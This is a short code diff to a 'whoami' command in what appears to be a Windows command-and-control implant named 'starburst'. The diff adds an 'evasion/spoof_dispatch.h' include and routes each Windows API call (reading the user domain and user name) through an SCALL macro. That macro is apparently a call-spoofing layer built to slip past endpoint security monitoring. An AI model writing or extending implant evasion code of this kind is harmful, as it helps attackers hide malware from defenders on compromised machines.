@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_WHOAMI
 
@@ -19,21 +20,21 @@ auto declfn starburst::cmd_whoami(
 
     // domain
     wchar_t domain_w[128] = { 0 };
-    inst.kernel32.GetEnvironmentVariableW(
+    SCALL( inst, kernel32.GetEnvironmentVariableW,
         symbol<LPCWSTR>( L"USERDOMAIN" ),
         domain_w, 128
     );
 
     char domain[128] = { 0 };
-    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
+    SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, domain_w, -1, domain, 128, nullptr, nullptr );
 
     // username
     wchar_t user_w[128] = { 0 };
     DWORD usize = 128;
-    inst.advapi32.GetUserNameW( user_w, &usize );
+    SCALL( inst, advapi32.GetUserNameW, user_w, &usize );
 
     char user[128] = { 0 };
-    inst.kernel32.WideCharToMultiByte( CP_ACP, 0, user_w, -1, user, 128, nullptr, nullptr );
+    SCALL( inst, kernel32.WideCharToMultiByte, CP_ACP, 0, user_w, -1, user, 128, nullptr, nullptr );
 
     // domain\user
     str_copy( result, domain );
